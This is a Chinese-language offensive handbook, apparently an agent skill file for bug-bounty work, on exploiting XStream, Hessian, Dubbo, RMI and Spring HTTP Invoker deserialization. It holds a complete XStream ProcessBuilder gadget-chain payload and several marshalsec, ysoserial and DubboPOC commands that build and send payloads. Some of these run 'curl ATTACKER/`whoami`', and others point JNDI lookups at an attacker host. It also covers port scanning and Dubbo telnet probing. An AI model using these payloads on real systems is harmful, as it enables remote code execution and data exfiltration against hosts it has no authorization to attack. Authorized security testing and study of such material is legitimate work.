# XStream / Hessian / Dubbo 反序列化深度手册

← 回主入口 [../../SKILL.md](../../SKILL.md)

> **CWE**: CWE-502 | **CVE 家族**: XStream CVE-2021-21342~21351 / 29505 / 39139~39154; Dubbo CVE-2020-1948 / 25640 / 30179 / 32824; Hessian 通用反序列化
> **核心**: XML/Hessian 序列化协议触发任意类构造 → JNDI/Runtime/Process gadget → RCE
> **赏金**: 严重 $5000-$25000 (微服务 / RPC / SOAP 接口常见)

---

## 0. First-pass Payload (XStream JNDI)

```xml
<map>
  <entry>
    <jdk.nashorn.internal.objects.NativeString>
      <flags>0</flags>
      <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
        <dataHandler>
          <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
            <is class="javax.crypto.CipherInputStream">
              <cipher class="javax.crypto.NullCipher">
                <serviceIterator class="javax.imageio.spi.FilterIterator">
                  <iter class="javax.imageio.spi.FilterIterator">
                    <iter class="java.util.Collections$EmptyIterator"/>
                    <next class="java.lang.ProcessBuilder">
                      <command><string>curl</string><string>ATTACKER/$(whoami)</string></command>
                      <redirectErrorStream>false</redirectErrorStream>
                    </next>
                  </iter>
                  <filter class="javax.imageio.ImageIO$ContainsFilter">
                    <method><class>java.lang.ProcessBuilder</class><name>start</name><parameter-types/></method>
                    <name>foo</name>
                  </filter>
                  <next class="string">foo</next>
                </serviceIterator>
              </cipher>
              <input class="java.lang.ProcessBuilder$NullInputStream"/>
              <ibuffer/>
            </is>
          </dataSource>
        </dataHandler>
      </value>
    </jdk.nashorn.internal.objects.NativeString>
    <string>foo</string>
  </entry>
</map>
```

> 这是 XStream 通用 ProcessBuilder 链, 适配 1.4.13 及以下。1.4.14+ 黑名单更全, 需找新 gadget。

---

## 1. XStream 反序列化

### 1.1 触发条件

```java
XStream xstream = new XStream();
xstream.fromXML(userInput);   // 漏洞: 用户控制 XML
```

XStream 默认允许任意类反序列化, 即使 1.4.7+ 引入了黑名单, 仍频繁被绕过。

### 1.2 接口形态

XStream 常见的应用场景:

| 场景 | 触发位置 |
|------|---------|
| RESTful API 接收 `application/xml` | Spring `@RequestBody` 自动解析 XML |
| SOAP 服务 | 用 XStream 替代 JAXB |
| 配置文件解析 (用户上传) | `<bean>` / `<property>` 等 |
| Cookie / Session 序列化 | 部分系统 |
| 消息队列 payload | RabbitMQ / Kafka 自定义 serializer |

### 1.3 主要 CVE 速查

| CVE | 受影响版本 | 触发要点 |
|-----|-----------|---------|
| CVE-2013-7285 | < 1.4.7 | ImageIO 经典链 |
| CVE-2021-21342 | < 1.4.16 | SSRF via DataHandler |
| CVE-2021-21344 | < 1.4.16 | RCE via JNDI lookup |
| CVE-2021-21346 | < 1.4.16 | RCE via Java native |
| CVE-2021-21348 | < 1.4.16 | DoS / RCE |
| CVE-2021-21350 | < 1.4.16 | RCE 通用链 |
| CVE-2021-29505 | < 1.4.17 | 全套 RCE 总集合 |
| CVE-2021-39139~39154 | < 1.4.18 | 进一步绕过 |
| CVE-2022-40151~40156 | < 1.4.20 | 持续 |

每个 CVE 对应一个 gadget, 完整列表 → https://x-stream.github.io/security.html

### 1.4 1.4.18+ 沙箱

1.4.18 启用 **secure framework**: 默认拒绝所有非白名单类。漏洞概率大幅下降, 但**配置错误**(`addPermission(AnyTypePermission.ANY)`) 仍打回原型。

---

## 2. Hessian 反序列化

### 2.1 协议

Hessian 是 Caucho 开发的二进制 RPC 协议, 序列化对象时也走 readObject → 触发 gadget。

```bash
# Hessian 包头 (Hessian 1.0): 'c' 'r' '0' '1'
# Hessian 2.0: 'H' '2' '0' (后续是 method)

# 抓包看到 Content-Type: x-application/hessian / application/x-hessian
```

### 2.2 触发位置

- **Spring HessianServiceExporter** 暴露的 RPC 端点
- **Apache Dubbo** 默认协议之一
- **Caucho Resin** 应用服务器
- WebLogic 部分组件

### 2.3 利用流程

```bash
# 1. 准备 marshalsec 生成 Hessian payload
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Hessian \
  -t Resin -a "curl ATTACKER/`whoami`" > payload.hessian

# 2. 发到 Hessian endpoint
curl -X POST https://target.com/hessian-service \
  -H "Content-Type: x-application/hessian" \
  --data-binary @payload.hessian
```

### 2.4 Gadget

- **CaucauScript** (Caucho 自带, RCE 链)
- **Resin** (Resin 应用服务器特有)
- **Rome** (rome-utils 依赖, 通用)
- **XBean** (Apache XBean)

---

## 3. Apache Dubbo 漏洞家族

Dubbo 默认 Hessian2 协议 + 服务端可触发反序列化。

### 3.1 主要 CVE

| CVE | 版本 | 描述 |
|-----|------|------|
| CVE-2020-1948 | 2.7.0~2.7.6 / 2.6.x | Hessian2 反序列化 RCE |
| CVE-2020-1948 ext | < 2.7.7 | 续修绕过 |
| CVE-2021-25640 | < 2.7.10 | 反序列化绕过 |
| CVE-2021-30179 | < 2.7.10 | Generic Filter 绕过 |
| CVE-2021-30180 | < 2.7.10 | Yaml 反序列化 |
| CVE-2021-30181 | < 2.7.10 | Nashorn JS 注入 |
| CVE-2021-32824 | < 2.7.10 | Telnet handler RCE |
| CVE-2023-23638 | < 3.1.5 | 反序列化通用绕过 |

### 3.2 探测

```bash
# 默认端口 20880 (Dubbo) / 21881 (Telnet)
nmap -p 20880,21881 target.com

# Telnet 可探:
nc target.com 21881
> ls
> status
```

### 3.3 利用 (CVE-2020-1948)

```bash
# 用 dubbo-attack 工具 (社区已成熟)
java -jar DubboPOC.jar -t target.com:20880 -c "curl ATTACKER/`whoami`"
```

或自己构造 RpcInvocation, 设置 attachments 包含 gadget。

---

## 4. 其他 RPC 协议反序列化

### 4.1 Java RMI (Remote Method Invocation)

默认端口 1099。`ysoserial` 的 `JRMPClient` / `JRMPListener` 链:

```bash
# 启动恶意 RMI 服务器
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 9999 CommonsCollections5 "curl ATTACKER/"

# 客户端被诱导连接 (例如通过 Hessian / RMI 反向)
java -cp ysoserial.jar ysoserial.exploit.JRMPClient target.com 1099 9999
```

### 4.2 JNDI + IIOP / CORBA

```
service:jmx:rmi:///jndi/rmi://ATTACKER:1099/Exploit
service:jmx:iiop:///jndi/iiop://ATTACKER:7777/Exploit
```

详 → [jndi-log4shell.md](jndi-log4shell.md)

### 4.3 Spring HTTP Invoker

类 RPC 协议, `Content-Type: application/x-java-serialized-object`。直接 Java 原生序列化 → ysoserial 通杀。

```bash
java -jar ysoserial.jar CommonsCollections5 "curl ATTACKER" > payload.ser
curl -X POST https://target.com/spring-invoker \
  -H "Content-Type: application/x-java-serialized-object" \
  --data-binary @payload.ser
```

---

## 5. 探测自动化

### 5.1 nuclei 模板

```bash
${NUCLEI_PATH}/nuclei.exe -tags xstream,dubbo,hessian -l urls.txt
```

### 5.2 marshalsec 一站式

```bash
# 列出所有支持的 marshallers
java -jar marshalsec.jar

# 针对每种生成 payload
java -cp marshalsec.jar marshalsec.XStream Java8u20 "curl ATTACKER"
java -cp marshalsec.jar marshalsec.Hessian Resin "curl ATTACKER"
java -cp marshalsec.jar marshalsec.Json Spring1 "curl ATTACKER"
java -cp marshalsec.jar marshalsec.Yaml SnakeYaml "curl ATTACKER"
java -cp marshalsec.jar marshalsec.JsonSerial JdkSerial "curl ATTACKER"
```

### 5.3 ysoserial (Java 原生反序列化)

依然是基础工具, 用于 RMI / Spring HTTP Invoker / Hessian gadget chain 配套。

---

## 6. Testing Checklist

- [ ] 找接收 XML 的接口, Content-Type: application/xml/text/xml
- [ ] 找接收 Hessian 的接口 (UA / Content-Type 标识)
- [ ] 端口扫: 1099 (RMI) / 20880 (Dubbo) / 21881 (Dubbo Telnet) / 1414 (MQ)
- [ ] Spring Hessian / HTTP Invoker endpoint
- [ ] SOAP endpoint (`?wsdl`) 看 binding
- [ ] 用 marshalsec 生成 payload, 配合 LDAP/HTTP server
- [ ] DNSLog 优先探测 (URLDNS / Inet4Address)
- [ ] 多版本 payload 试: 1.4.13 / 1.4.16 / 1.4.18 都试
- [ ] Dubbo: telnet 命令 + 反序列化两条线都试
- [ ] 配合 Spring Boot Actuator (jolokia → MBean → 写文件)

---

## 7. False Positive Traps

| 陷阱 | 真相 |
|------|------|
| XStream 报 `unknown class` | 黑名单生效, 换 1.4.16 通用链 |
| Hessian 解析失败 | 协议版本不匹配 (1.0 vs 2.0), 调整包头 |
| Dubbo 端口开放但 telnet 无响应 | 可能仅暴露 RPC 协议, 用 dubbo-attack 试 |
| RMI 1099 开放但 ysoserial 无效 | 可能是 JEP 290 反序列化过滤生效, 试 JRMP 反向 |
| 1.4.18+ secure framework | 沙箱严, 概率低; 但配置错(AnyTypePermission)仍打 |

---

## 8. 影响证明

- **低**: 协议解析触发 (DNSLog 回调)
- **中**: SSRF 探测 / 内网扫描
- **高**: Class 加载 + RCE
- **严重**: 完整 whoami / id, 读取微服务配置 (Nacos / Apollo / k8s ConfigMap)

---

## 9. 相关参考

- 主入口 → [../../SKILL.md](../../SKILL.md)
- Java 通用反序列化 → [deserialize.md](deserialize.md)
- Fastjson / Jackson → [fastjson-jackson.md](fastjson-jackson.md)
- Shiro 反序列化 → [shiro.md](shiro.md)
- JNDI / Log4Shell (gadget 加载机制) → [jndi-log4shell.md](jndi-log4shell.md)
- Spring 漏洞 → [spring-vuln.md](spring-vuln.md)
- OOB → [../oob-infrastructure.md](../oob-infrastructure.md)

---

**CWE**: CWE-502 | **CVE 速查**: CVE-2020-1948 (Dubbo 9.8) / CVE-2021-29505 (XStream 9.8) / CVE-2023-23638 (Dubbo 9.8) | **CVSS 典型**: 9.8 (默认配置 RCE) / 8.1 (需绕黑名单)
